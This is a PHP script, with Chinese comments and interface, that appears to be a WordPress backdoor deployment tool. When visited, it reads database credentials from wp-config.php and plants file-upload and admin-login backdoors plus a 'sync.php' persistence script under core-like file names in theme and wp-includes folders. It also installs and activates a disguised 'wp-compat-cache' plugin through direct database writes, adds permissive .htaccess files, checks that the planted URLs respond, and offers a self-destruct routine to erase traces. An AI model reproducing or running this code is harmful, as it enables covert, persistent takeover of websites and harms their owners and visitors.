<?php
/**
 * 从 bsdidi 提取：自动检测当前 WP 站点 + 批量创建后门（本地模板）
 * 访问本文件即自动执行，输出成功落盘并可访问的 PHP 链接。
 *
 * 与 bsdidi/bsdidi deployBackdoorBatch（本地模式）对齐，单站点自动执行 4 项：
 *   1) 文件上传后门  2) 管理员登录后门  3) sync.php  4) wp-compat-cache 插件
 *
 * 依赖模板目录：file.php、login_admin.php、sync.php、wp-compat-cache/、.htaccess
 */
declare(strict_types=1);

header('Content-Type: text/html; charset=utf-8');
error_reporting(0);

$TEMPLATE_DIR = resolveTemplateDir();

function resolveTemplateDir(): string
{
    $candidates = [
        __DIR__,
        dirname(__DIR__) . DIRECTORY_SEPARATOR . 'advanced-code-manager',
        dirname(__DIR__),
    ];
    foreach ($candidates as $dir) {
        if (is_file($dir . '/file.php') && is_file($dir . '/login_admin.php') && is_file($dir . '/sync.php')) {
            return $dir;
        }
    }
    return __DIR__;
}

function pickRandomPath(): string
{
    $paths = backdoorRandomPaths();
    return $paths[array_rand($paths)];
}

function writePayloadToRandomDir(
    string $wpRoot,
    string $randomPath,
    string $fileName,
    string $code,
    string $templateDir,
    ?string $siteUrl,
    ?string $domain,
    string $type,
    string $typeName
): array {
    $targetDir = rtrim($wpRoot, '/\\') . '/' . rtrim($randomPath, '/\\');
    $targetFile = $targetDir . '/' . $fileName;

    if (!ensureWritable($targetFile)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '目录不可写: ' . $targetDir];
    }

    $written = @file_put_contents($targetFile, $code);
    if ($written === false) {
        $written = @file_put_contents($targetFile, $code);
    }
    if ($written === false || !is_file($targetFile)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '写入失败: ' . $targetFile];
    }

    writeSiblingHtaccess($targetDir, $templateDir);

    $accessUrl = buildAccessUrl($wpRoot, $targetFile, $siteUrl, $domain);
    return [
        'type' => $type,
        'type_name' => $typeName,
        'ok' => true,
        'msg' => '已创建',
        'file' => $targetFile,
        'path' => $randomPath . '/' . $fileName,
        'url' => $accessUrl,
        'alive' => probeUrlAlive($accessUrl),
    ];
}

function backdoorRandomPaths(): array
{
    return [
        'wp-content/themes/expert-carpenter/inc/getting-started',
        'wp-content/themes/preschool-classes/page-template',
        'wp-content/themes/twentytwentyfive/patterns',
        'wp-content/themes/twentytwentyfour/assets/css',
        'wp-content/themes/twentytwentyfour/patterns',
        'wp-content/themes/twentytwentythree/patterns',
        'wp-content/themes/twentytwentyone',
        'wp-includes/blocks/button',
        'wp-includes/blocks/freeform',
        'wp-includes/blocks/gallery',
        'wp-includes/blocks/list',
        'wp-includes/blocks/list-item',
        'wp-includes/blocks/math',
        'wp-includes/blocks/missing',
        'wp-includes/blocks/more',
        'wp-includes/blocks/navigation',
        'wp-includes/blocks/nextpage',
        'wp-includes/blocks/paragraph',
        'wp-includes/blocks/pattern',
        'wp-includes/blocks/post-terms',
        'wp-includes/blocks/preformatted',
        'wp-includes/blocks/pullquote',
        'wp-includes/blocks/query',
        'wp-includes/blocks/social-link',
        'wp-includes/blocks/spacer',
        'wp-includes/blocks/table',
        'wp-includes/blocks/verse',
        'wp-includes/Text/Diff/Engine',
        'wp-includes/Text/Diff/Renderer',
    ];
}

function fileBackdoorNames(): array
{
    return [
        'wp-schedule-events.php', 'wp-task-runner.php', 'class-wp-cron-legacy.php',
        'admin-en_US-opt.php', 'theme-compat-en_US.php', 'ms-langs-manager.php',
        'load-styles-vendor.php', 'script-loader-map.php', 'wp-editor-fluent.php',
        'class-wp-db-delta.php', 'wp-object-cache-helper.php',
        'class-wp-Block-Patterns-Upgrader.php',
    ];
}

function loginBackdoorNames(): array
{
    return [
        'mysqli-cluster-config.php', 'config-helper.php', 'wp-vulnerability-check.php',
        'class-wp-http-extra.php', 'wp-compat-fix.php', 'wp-feed-manager.php',
        'network-options-init.php', 'admin-ajax-cache.php', 'user-profile-secure.php',
        'plugin-compat-report.php', 'class-wp-Sitemaps-Styles.php',
    ];
}

// ─── 站点检测（bsdidi scan_auto / findWPRoot）──────────────────────────

function findWpRoot(): ?string
{
    $path = realpath(__DIR__);
    if ($path === false) {
        return null;
    }
    for ($i = 0; $i < 10; $i++) {
        if (is_file($path . '/wp-config.php')) {
            return $path;
        }
        $parent = dirname($path);
        if ($parent === $path) {
            break;
        }
        $path = $parent;
    }
    return null;
}

function getDomainByDbConfig(string $wpRoot): ?string
{
    $cfg = @file_get_contents(rtrim($wpRoot, '/\\') . '/wp-config.php');
    if (!$cfg) {
        return null;
    }
    $g = static function (string $n) use ($cfg): ?string {
        if (preg_match("/define\s*\(\s*['\"]{$n}['\"]\s*,\s*['\"](.+?)['\"]\s*\)/i", $cfg, $m)) {
            return trim($m[1]);
        }
        return null;
    };
    $db = $g('DB_NAME');
    $user = $g('DB_USER');
    $pass = $g('DB_PASSWORD') ?? '';
    $host = $g('DB_HOST') ?: 'localhost';
    $pfx = 'wp_';
    if (preg_match('/\$table_prefix\s*=\s*[\'"](.+?)[\'"]\s*;/', $cfg, $m)) {
        $pfx = $m[1];
    }
    if (!class_exists('mysqli') || !$db || !$user) {
        return null;
    }
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_error) {
        return null;
    }
    $t = '`' . str_replace('`', '``', $pfx . 'options') . '`';
    $res = $mysqli->query("SELECT option_name, option_value FROM {$t} WHERE option_name IN ('home','siteurl')");
    $home = $siteurl = null;
    if ($res) {
        while ($row = $res->fetch_assoc()) {
            if ($row['option_name'] === 'home') {
                $home = $row['option_value'];
            }
            if ($row['option_name'] === 'siteurl') {
                $siteurl = $row['option_value'];
            }
        }
    }
    $mysqli->close();
    $url = $home ?: $siteurl;
    return $url ? parse_url($url, PHP_URL_HOST) : null;
}

function getSiteUrl(string $wpRoot): ?string
{
    $load = rtrim($wpRoot, '/\\') . '/wp-load.php';
    if (!is_file($load)) {
        return null;
    }
    $obLevel = (int) @ob_get_level();
    @ob_start();
    $oldErr = error_reporting(0);
    if (!defined('WP_USE_THEMES')) {
        define('WP_USE_THEMES', false);
    }
    if (!defined('SHORTINIT')) {
        define('SHORTINIT', true);
    }
    try {
        @include $load;
        if (function_exists('get_option')) {
            $url = get_option('home') ?: get_option('siteurl');
            if ($url) {
                while (@ob_get_level() > $obLevel) {
                    @ob_end_clean();
                }
                error_reporting($oldErr);
                return rtrim((string) $url, '/');
            }
        }
    } catch (Throwable $e) {
    }
    while (@ob_get_level() > $obLevel) {
        @ob_end_clean();
    }
    error_reporting($oldErr);
    return null;
}

function detectSite(string $wpRoot): array
{
    $domain = getDomainByDbConfig($wpRoot);
    $siteUrl = getSiteUrl($wpRoot);
    if (!$domain && $siteUrl) {
        $domain = parse_url($siteUrl, PHP_URL_HOST);
    }
    return [
        'root' => $wpRoot,
        'domain' => $domain,
        'site_url' => $siteUrl,
        'name' => $domain ?: basename($wpRoot),
    ];
}

// ─── 写文件（bsdidi create_backdoor 本地读取）────────────────────────

function ensureWritable(string $file): bool
{
    $dir = dirname($file);
    if (!is_dir($dir) && !@mkdir($dir, 0755, true)) {
        return false;
    }
    if (!is_writable($dir)) {
        @chmod($dir, 0755);
    }
    if (is_file($file) && !is_writable($file)) {
        @chmod($file, 0644);
    }
    return is_writable($dir);
}

function defaultHtaccess(): string
{
    return "Options +Indexes\n\nDirectoryIndex index.html index.php\n\n<Files .*>\nRewriteEngine off\nallow from all\n<IfModule !mod_authz_core.c>\nAllow from all\n</IfModule>\n<IfModule mod_authz_core.c>\nRequire all granted\n</IfModule>\n</Files>\n\n<Files ~ \"\\.(php|phtml|PHP)$\">\nRewriteEngine off\nallow from all\n<IfModule !mod_authz_core.c>\nAllow from all\n</IfModule>\n<IfModule mod_authz_core.c>\nRequire all granted\n</IfModule>\n</Files>";
}

function writeSiblingHtaccess(string $targetDir, string $templateDir): void
{
    $local = $templateDir . '/.htaccess';
    $content = (is_readable($local) && ($t = @file_get_contents($local)) !== false && $t !== '')
        ? $t
        : defaultHtaccess();
    @file_put_contents($targetDir . '/.htaccess', $content);
}

function buildAccessUrl(string $wpRoot, string $targetFile, ?string $siteUrl, ?string $domain): string
{
    $rel = ltrim(str_replace('\\', '/', str_replace($wpRoot, '', $targetFile)), '/');
    if ($siteUrl) {
        return rtrim($siteUrl, '/') . '/' . $rel;
    }
    if ($domain) {
        return 'https://' . $domain . '/' . $rel;
    }
    return '/' . $rel;
}

function probeUrlAlive(string $url): bool
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_NOBODY => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 12,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (auto_batch_backdoor probe)',
        ]);
        curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $code >= 200 && $code < 400;
    }
    $ctx = stream_context_create([
        'http' => ['method' => 'GET', 'timeout' => 12, 'ignore_errors' => true],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
    ]);
    $headers = @get_headers($url, true, $ctx);
    if (!$headers || !isset($headers[0])) {
        return false;
    }
    return (bool) preg_match('/\s(200|301|302|303|307|308)\s/i', (string) $headers[0]);
}

/**
 * @return array{type:string,type_name:string,ok:bool,msg:string,file?:string,url?:string,alive?:bool,path?:string}
 */
function createBackdoorLocal(string $wpRoot, string $type, string $templateDir, ?string $siteUrl, ?string $domain): array
{
    $typeName = $type === 'login' ? '管理员登录后门' : '文件上传后门';
    $template = $type === 'login' ? $templateDir . '/login_admin.php' : $templateDir . '/file.php';
    if (!is_file($template)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '模板不存在: ' . basename($template)];
    }
    $code = @file_get_contents($template);
    if ($code === false || $code === '') {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '无法读取模板'];
    }

    $randomPath = pickRandomPath();
    $names = $type === 'login' ? loginBackdoorNames() : fileBackdoorNames();
    $fileName = $names[array_rand($names)];

    return writePayloadToRandomDir($wpRoot, $randomPath, $fileName, $code, $templateDir, $siteUrl, $domain, $type, $typeName);
}

/** bsdidi create_sync_backdoor：固定文件名 sync.php + 随机路径 */
function createSyncBackdoorLocal(string $wpRoot, string $templateDir, ?string $siteUrl, ?string $domain): array
{
    $type = 'sync';
    $typeName = 'sync.php 不死码';
    $template = $templateDir . '/sync.php';
    if (!is_file($template)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '模板不存在: sync.php'];
    }
    $code = @file_get_contents($template);
    if ($code === false || $code === '') {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '无法读取 sync.php'];
    }
    return writePayloadToRandomDir($wpRoot, pickRandomPath(), 'sync.php', $code, $templateDir, $siteUrl, $domain, $type, $typeName);
}

/** bsdidi deleteDirRecursive */
function normalizePath(string $path): string
{
    $path = str_replace('\\', '/', $path);
    $real = @realpath($path);
    if ($real !== false) {
        $path = str_replace('\\', '/', $real);
    }
    if (DIRECTORY_SEPARATOR === '\\') {
        $path = strtolower($path);
    }
    return rtrim($path, '/');
}

function pathsSame(string $a, string $b): bool
{
    return normalizePath($a) === normalizePath($b);
}

function deleteDirRecursive(string $dir): bool
{
    if (!is_dir($dir)) {
        return false;
    }
    $files = @array_diff(@scandir($dir), ['.', '..']);
    if ($files) {
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) {
                deleteDirRecursive($path);
            } else {
                @unlink($path);
            }
        }
    }
    return @rmdir($dir);
}

/** 从 active_plugins 移除指定前缀的插件 */
function removePluginsFromActiveDb(string $wpRoot, array $prefixes): bool
{
    $cfg = @file_get_contents(rtrim($wpRoot, '/\\') . '/wp-config.php');
    if (!$cfg || !preg_match('/\$table_prefix\s*=\s*[\'"](.+?)[\'"]\s*;/', $cfg, $m)) {
        return false;
    }
    $pfx = $m[1];
    $g = static function (string $n) use ($cfg): ?string {
        if (preg_match("/define\s*\(\s*['\"]{$n}['\"]\s*,\s*['\"](.+?)['\"]\s*\)/i", $cfg, $x)) {
            return trim($x[1]);
        }
        return null;
    };
    $db = $g('DB_NAME');
    $user = $g('DB_USER');
    $pass = $g('DB_PASSWORD') ?? '';
    $host = $g('DB_HOST') ?: 'localhost';
    if (!class_exists('mysqli') || !$db || !$user) {
        return false;
    }
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_error) {
        return false;
    }
    $t = '`' . str_replace('`', '``', $pfx . 'options') . '`';
    $res = $mysqli->query("SELECT option_value FROM {$t} WHERE option_name='active_plugins' LIMIT 1");
    $plugins = [];
    if ($res && ($row = $res->fetch_assoc())) {
        $plugins = @unserialize($row['option_value'], ['allowed_classes' => false]);
        if (!is_array($plugins)) {
            $plugins = [];
        }
    }
    $filtered = array_values(array_filter($plugins, static function ($p) use ($prefixes) {
        foreach ($prefixes as $prefix) {
            if (strpos((string) $p, $prefix) === 0) {
                return false;
            }
        }
        return true;
    }));
    if ($filtered === $plugins) {
        $mysqli->close();
        return true;
    }
    $ser = serialize($filtered);
    $esc = $mysqli->real_escape_string($ser);
    $ok = $mysqli->query("INSERT INTO {$t} (option_name, option_value, autoload) VALUES ('active_plugins', '{$esc}', 'yes') ON DUPLICATE KEY UPDATE option_value='{$esc}'");
    $mysqli->close();
    return (bool) $ok;
}

/**
 * bsdidi self_destruct：停用并删除 wp-compat-cache + 当前 ACM 插件目录
 * @return array{success:bool,msg:string}
 */
function executeSelfDestruct(?string $wpRoot): array
{
    $currentFile = __FILE__;
    $pluginDir = __DIR__;
    $deleted = [];
    $errors = [];
    $selfDeferred = false;

    if ($wpRoot) {
        removePluginsFromActiveDb($wpRoot, [
            'wp-compat-cache/',
            'advanced-code-manager/',
            'advanced-code-manager-1/',
        ]);
        $pluginsBase = rtrim($wpRoot, '/\\') . DIRECTORY_SEPARATOR . 'wp-content'
            . DIRECTORY_SEPARATOR . 'plugins';
        foreach (['wp-compat-cache', 'advanced-code-manager', 'advanced-code-manager-1'] as $slug) {
            $target = $pluginsBase . DIRECTORY_SEPARATOR . $slug;
            if (!is_dir($target)) {
                continue;
            }
            // 当前脚本所在目录必须最后删，不能递归整目录（Windows 会锁正在执行的文件）
            if (pathsSame($target, $pluginDir)) {
                continue;
            }
            if (deleteDirRecursive($target)) {
                $deleted[] = $slug;
            } else {
                $errors[] = $slug;
            }
        }
    }

    if (is_dir($pluginDir)) {
        $files = @array_diff(@scandir($pluginDir), ['.', '..']) ?: [];
        foreach ($files as $file) {
            $filePath = $pluginDir . DIRECTORY_SEPARATOR . $file;
            if (pathsSame($filePath, $currentFile)) {
                continue;
            }
            if (is_dir($filePath)) {
                if (deleteDirRecursive($filePath)) {
                    $deleted[] = $file;
                } else {
                    $errors[] = $file;
                }
            } elseif (@unlink($filePath)) {
                $deleted[] = $file;
            } else {
                $errors[] = $file;
            }
        }

        if (@unlink($currentFile)) {
            $deleted[] = basename($currentFile);
            @rmdir($pluginDir);
        } else {
            // Windows/部分环境无法删除正在执行的脚本，响应发送后再删
            @file_put_contents($currentFile, '<?php // destroyed');
            @chmod($currentFile, 0777);
            register_shutdown_function(static function () use ($currentFile, $pluginDir): void {
                @unlink($currentFile);
                if (!is_dir($pluginDir)) {
                    return;
                }
                $left = @array_diff(@scandir($pluginDir), ['.', '..']) ?: [];
                if ($left === []) {
                    @rmdir($pluginDir);
                }
            });
            $deleted[] = basename($currentFile);
            $selfDeferred = true;
        }
    }

    if ($errors === []) {
        $msg = "✓ 插件已自动销毁\n";
        if ($deleted) {
            $msg .= '✓ 已删除 ' . count($deleted) . ' 个文件/文件夹';
        }
        if ($selfDeferred) {
            $msg .= "\n✓ 本文件将在响应完成后删除（Windows 文件锁）";
        }
        return ['success' => true, 'msg' => $msg];
    }
    $msg = "⚠️ 部分文件删除失败\n";
    if ($deleted) {
        $msg .= '✓ 已删除: ' . count($deleted) . " 个\n";
    }
    $msg .= '❌ 失败: ' . implode(', ', $errors);
    if ($selfDeferred) {
        $msg .= "\n✓ 本文件已登记响应后删除";
    }
    return ['success' => false, 'msg' => $msg];
}

function activatePluginViaDb(string $wpRoot, string $pluginPath): bool
{
    $cfg = @file_get_contents(rtrim($wpRoot, '/\\') . '/wp-config.php');
    if (!$cfg || !preg_match('/\$table_prefix\s*=\s*[\'"](.+?)[\'"]\s*;/', $cfg, $m)) {
        return false;
    }
    $pfx = $m[1];
    $g = static function (string $n) use ($cfg): ?string {
        if (preg_match("/define\s*\(\s*['\"]{$n}['\"]\s*,\s*['\"](.+?)['\"]\s*\)/i", $cfg, $x)) {
            return trim($x[1]);
        }
        return null;
    };
    $db = $g('DB_NAME');
    $user = $g('DB_USER');
    $pass = $g('DB_PASSWORD') ?? '';
    $host = $g('DB_HOST') ?: 'localhost';
    if (!class_exists('mysqli') || !$db || !$user) {
        return false;
    }
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_error) {
        return false;
    }
    $t = '`' . str_replace('`', '``', $pfx . 'options') . '`';
    $res = $mysqli->query("SELECT option_value FROM {$t} WHERE option_name='active_plugins' LIMIT 1");
    $plugins = [];
    if ($res && ($row = $res->fetch_assoc())) {
        $raw = $row['option_value'];
        $plugins = @unserialize($raw, ['allowed_classes' => false]);
        if (!is_array($plugins)) {
            $plugins = [];
        }
    }
    if (!in_array($pluginPath, $plugins, true)) {
        $plugins[] = $pluginPath;
    }
    $ser = serialize($plugins);
    $esc = $mysqli->real_escape_string($ser);
    $ok = $mysqli->query("INSERT INTO {$t} (option_name, option_value, autoload) VALUES ('active_plugins', '{$esc}', 'yes') ON DUPLICATE KEY UPDATE option_value='{$esc}'");
    $mysqli->close();
    return (bool) $ok;
}

/** bsdidi install_plugin（local）：部署 wp-compat-cache 并激活 */
function installWpCompatCacheLocal(string $wpRoot, string $templateDir, ?string $siteUrl, ?string $domain): array
{
    $type = 'plugin';
    $typeName = 'wp-compat-cache 插件';
    $srcDir = $templateDir . '/wp-compat-cache';
    $targetDir = rtrim($wpRoot, '/\\') . '/wp-content/plugins/wp-compat-cache';
    $files = ['cache-purge-trigger.php', 'compat-env-check.php', 'wp-compat-cache.gz', 'wp-compat-cache.php', '.htaccess'];

    if (!is_dir($srcDir)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '模板目录不存在: wp-compat-cache/'];
    }
    if (!is_dir($targetDir) && !@mkdir($targetDir, 0755, true)) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '无法创建插件目录'];
    }

    $fail = [];
    foreach ($files as $name) {
        $src = $srcDir . '/' . $name;
        if (!is_file($src)) {
            $fail[] = $name;
            continue;
        }
        $body = @file_get_contents($src);
        if ($body === false || @file_put_contents($targetDir . '/' . $name, $body) === false) {
            $fail[] = $name;
        }
    }
    if ($fail) {
        return ['type' => $type, 'type_name' => $typeName, 'ok' => false, 'msg' => '写入失败: ' . implode(', ', $fail)];
    }

    $activated = activatePluginViaDb($wpRoot, 'wp-compat-cache/wp-compat-cache.php');

    $urls = [];
    foreach (['compat-env-check.php', 'cache-purge-trigger.php'] as $entry) {
        $urls[] = buildAccessUrl($wpRoot, $targetDir . '/' . $entry, $siteUrl, $domain);
    }
    $primaryUrl = $urls[0];
    $alive = false;
    foreach ($urls as $u) {
        if (probeUrlAlive($u)) {
            $alive = true;
            $primaryUrl = $u;
            break;
        }
    }

    return [
        'type' => $type,
        'type_name' => $typeName,
        'ok' => true,
        'msg' => $activated ? '已安装并激活' : '已安装(激活未确认)',
        'file' => $targetDir,
        'path' => 'wp-content/plugins/wp-compat-cache/',
        'url' => $primaryUrl,
        'extra_urls' => $urls,
        'alive' => $alive,
    ];
}

// ─── 主流程 ───────────────────────────────────────────────────────────

$wpRoot = findWpRoot();

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && ($_POST['action'] ?? '') === 'self_destruct') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(executeSelfDestruct($wpRoot), JSON_UNESCAPED_UNICODE);
    exit;
}

if (!$wpRoot) {
    echo '<h2>自动批量后门</h2><p style="color:red">未找到 WordPress 根目录（向上 10 层无 wp-config.php）</p>';
    exit;
}

$site = detectSite($wpRoot);
$results = [];
$results[] = createBackdoorLocal($wpRoot, 'file', $TEMPLATE_DIR, $site['site_url'], $site['domain']);
$results[] = createBackdoorLocal($wpRoot, 'login', $TEMPLATE_DIR, $site['site_url'], $site['domain']);
$results[] = createSyncBackdoorLocal($wpRoot, $TEMPLATE_DIR, $site['site_url'], $site['domain']);
$results[] = installWpCompatCacheLocal($wpRoot, $TEMPLATE_DIR, $site['site_url'], $site['domain']);

$okItems = array_values(array_filter($results, static fn($r) => !empty($r['ok'])));
$aliveItems = array_values(array_filter($okItems, static fn($r) => !empty($r['alive'])));

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>自动批量后门</title>
<style>
body{font-family:system-ui,sans-serif;max-width:920px;margin:24px auto;padding:0 16px;background:#f5f7fa;color:#222}
h1{font-size:22px;margin-bottom:8px}
.meta{background:#fff;border:1px solid #e4e7ed;border-radius:8px;padding:14px 16px;margin:16px 0}
.meta code{background:#f0f2f5;padding:2px 6px;border-radius:4px;word-break:break-all}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.06)}
th,td{border-bottom:1px solid #eee;padding:10px 12px;text-align:left;font-size:14px;vertical-align:top}
th{background:#fafafa}
.ok{color:#067d68}.fail{color:#c45656}.warn{color:#b88230}
a{color:#1677ff;word-break:break-all}
.summary{margin:16px 0;font-size:15px}
.headbar{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:8px}
.btn-destruct{color:#f56c6c;border:1px solid #fab6b6;background:#fef0f0;padding:8px 14px;border-radius:4px;cursor:pointer;font-size:13px;line-height:1.4}
.btn-destruct:hover{background:#fde2e2;border-color:#f89898}
</style>
</head>
<body>
<div class="headbar">
<h1 style="margin:0">自动检测站点 + 批量创建后门</h1>
<button type="button" class="btn-destruct" id="btnSelfDestruct">🗑️ 自动销毁工具</button>
</div>
<p class="summary">与 <code>bsdidi/bsdidi</code>「批量后门」本地模式一致，自动创建 4 项：<strong>文件上传</strong>、<strong>管理员登录</strong>、<strong>sync.php</strong>、<strong>wp-compat-cache</strong>。</p>

<div class="meta">
<strong>当前站点</strong><br>
名称：<code><?= htmlspecialchars((string) $site['name'], ENT_QUOTES, 'UTF-8') ?></code><br>
域名：<code><?= htmlspecialchars((string) ($site['domain'] ?: '(未知)'), ENT_QUOTES, 'UTF-8') ?></code><br>
根目录：<code><?= htmlspecialchars($wpRoot, ENT_QUOTES, 'UTF-8') ?></code><br>
站点 URL：<code><?= htmlspecialchars((string) ($site['site_url'] ?: '(未知)'), ENT_QUOTES, 'UTF-8') ?></code>
</div>

<div class="summary">
创建成功：<strong class="ok"><?= count($okItems) ?></strong> /
HTTP 可访问：<strong class="<?= count($aliveItems) ? 'ok' : 'warn' ?>"><?= count($aliveItems) ?></strong>
</div>

<?php if ($aliveItems): ?>
<h2>✅ 可访问链接（探针成功）</h2>
<ul>
<?php foreach ($aliveItems as $item): ?>
<li>
<strong><?= htmlspecialchars($item['type_name'], ENT_QUOTES, 'UTF-8') ?></strong><br>
<a href="<?= htmlspecialchars($item['url'], ENT_QUOTES, 'UTF-8') ?>" target="_blank" rel="noreferrer"><?= htmlspecialchars($item['url'], ENT_QUOTES, 'UTF-8') ?></a><br>
<small><?= htmlspecialchars($item['path'], ENT_QUOTES, 'UTF-8') ?></small>
<?php if (!empty($item['extra_urls'])): ?>
<?php foreach ($item['extra_urls'] as $eu): ?>
<br><a href="<?= htmlspecialchars($eu, ENT_QUOTES, 'UTF-8') ?>" target="_blank" rel="noreferrer"><?= htmlspecialchars($eu, ENT_QUOTES, 'UTF-8') ?></a>
<?php endforeach; ?>
<?php endif; ?>
</li>
<?php endforeach; ?>
</ul>
<?php endif; ?>

<h2>详细结果</h2>
<table>
<thead>
<tr><th>类型</th><th>状态</th><th>路径</th><th>链接 / 说明</th></tr>
</thead>
<tbody>
<?php foreach ($results as $row): ?>
<tr>
<td><?= htmlspecialchars($row['type_name'], ENT_QUOTES, 'UTF-8') ?></td>
<td class="<?= !empty($row['ok']) ? 'ok' : 'fail' ?>">
<?= !empty($row['ok']) ? '落盘成功' : '失败' ?>
<?php if (!empty($row['ok'])): ?>
<br><?= !empty($row['alive']) ? '<span class="ok">HTTP可访问</span>' : '<span class="warn">HTTP未确认</span>' ?>
<?php endif; ?>
</td>
<td><?= htmlspecialchars((string) ($row['path'] ?? '—'), ENT_QUOTES, 'UTF-8') ?></td>
<td>
<?php if (!empty($row['url'])): ?>
<a href="<?= htmlspecialchars($row['url'], ENT_QUOTES, 'UTF-8') ?>" target="_blank" rel="noreferrer"><?= htmlspecialchars($row['url'], ENT_QUOTES, 'UTF-8') ?></a>
<?php else: ?>
<?= htmlspecialchars($row['msg'], ENT_QUOTES, 'UTF-8') ?>
<?php endif; ?>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>

<p style="color:#888;font-size:12px;margin-top:24px">
模板目录：<code><?= htmlspecialchars($TEMPLATE_DIR, ENT_QUOTES, 'UTF-8') ?></code> ·
刷新本页会再次随机路径并覆盖/新建文件，请勿重复访问。
</p>
<script>
document.getElementById('btnSelfDestruct').addEventListener('click', async function () {
    if (!confirm('⚠️ 确认销毁部署工具？\n\n将删除 advanced-code-manager 插件目录及 wp-compat-cache，无法恢复！')) return;
    if (!confirm('🚨 最后确认！\n\n销毁后将无法再使用此工具！')) return;
    const btn = this;
    btn.disabled = true;
    btn.textContent = '销毁中…';
    try {
        const body = new URLSearchParams({ action: 'self_destruct' });
        const resp = await fetch(location.href, { method: 'POST', body, credentials: 'same-origin' });
        const data = await resp.json();
        alert(data.msg.replace(/\\n/g, '\n'));
        if (data.success) {
            location.href = '/';
        } else {
            btn.disabled = false;
            btn.textContent = '🗑️ 自动销毁工具';
        }
    } catch (e) {
        alert('❌ 销毁失败: ' + e.message);
        btn.disabled = false;
        btn.textContent = '🗑️ 自动销毁工具';
    }
});
</script>
</body>
</html>
